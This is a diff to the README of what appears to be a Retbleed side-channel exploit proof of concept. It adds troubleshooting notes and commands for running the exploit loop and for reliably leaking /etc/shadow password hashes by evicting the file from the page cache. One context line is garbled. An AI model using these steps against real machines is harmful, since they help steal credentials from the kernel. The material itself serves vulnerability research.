@@ -85,9 +85,10 @@ Usage: ./retbleed --cpu1=<value> --cpu2=<value> --kbase=<kernel_base>
 ```
 
 Sometimes Retbleed will not immediately lock on to the signal. We are not
-sure about what the exact reason is. However, restarting it will eventually
-result in getting a signal, hence we run it in a loop until it exits with a
-without an error status:
+sure about what the exact reason is, but it's likely that the kernel stack gets
+allocated in an unfortunate location that were unable to evict. However,
+restarting it will eventually result in getting a signal, hence we run it in a
+loop until it exits with a without an error status:
 
 ```
 /exploits$ ./do_retbleed.sh 0 0xffffffffa0600000 leak_perf
@@ -113,3 +114,17 @@ However, doing so will makd a partXof your RAM unusable.?????????6L1TF: Re
 ```
 
 Sometimes it takes several minutes before it successfully starts to leak.
+
+
+##### Leaking /etc/shadow does not work?
+We've observed that occasionally /etc/shadow gets allocated in a problematic
+location that for what ever reason is difficult to leak. To overcome this, evict
+it from the page cache and put it back:
+
+```
+make -C ../misc/ mem_pressure
+../misc/mem_pressure # kick it out
+passwd -S # bring it back
+```
+
+
